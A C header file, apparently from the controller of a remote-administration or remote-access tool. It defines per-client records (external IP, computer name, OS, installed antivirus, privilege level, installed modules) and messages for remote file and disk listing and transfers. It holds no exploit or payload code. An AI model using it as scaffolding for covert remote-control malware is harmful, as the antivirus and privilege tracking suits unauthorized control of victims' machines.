#pragma once
#include "env/EnvData.h"
#include "ModuleMessage.h"
//客户端基本信息
#define MAX_LOCALIP_COUNT 5
#define MAX_MODNAMES 1024
#define MAX_ITEM 255
typedef struct  
{
	WCHAR			clientid[60];	//客户端id
	ULONG			connectIP;	//外网IP
	WCHAR			computerName[MAX_COMPUTERNAME_LENGTH + 1];	//计算机名
	WIN_VER_DETAIL	windowsVersion;	//操作系统
	BOOL			bX64;	//是否x64平台
	SYSTEMTIME		installTime;	//客户端安装时间
	WCHAR			avname[MAX_PATH];	//杀毒软件
	ULONG			localIPList[MAX_LOCALIP_COUNT];	//本地IP列表
	USHORT			localIPCount;	//本地IP列表个数
	WCHAR			groups[MAX_ITEM]; //分组名
	WCHAR			priv[MAX_ITEM]; //权限
	WCHAR			proto[MAX_ITEM]; //协议
	WCHAR			vercode[MAX_ITEM];//操作系统版本号
	WCHAR			lang[MAX_ITEM];//语言
	int				cpunum;
	int				cpufrep;
	int				memsize;
	WCHAR			mods[MAX_MODNAMES];	//已安装模块
} CLIENT_INFO;
enum {
	WM_ADD_CLIENT = WM_USER + 1001,
	WM_DEL_CLIENT,
	WM_LISTFILES,	//MFileInfoList* / NULL
	WM_LISTDISKS,	//MDiskInfoList* / NULL
	WM_TRANSFER_FINISH
};

typedef enum
{
	MODULESTATUS_UNINSTALLED = 0,
	MODULESTATUS_INSTALLING,
	MODULESTATUS_INSTALLED,
} MODULE_INST_STATUS;

typedef void (CALLBACK *FnNotifyProc)(UINT nMsg, LPVOID lpContext, LPVOID lpParameter);
typedef void (CALLBACK *FnModuleNotifyProc)(LPCTSTR clientid,UINT nMsg, LPVOID lpContext, LPVOID lpParameter);
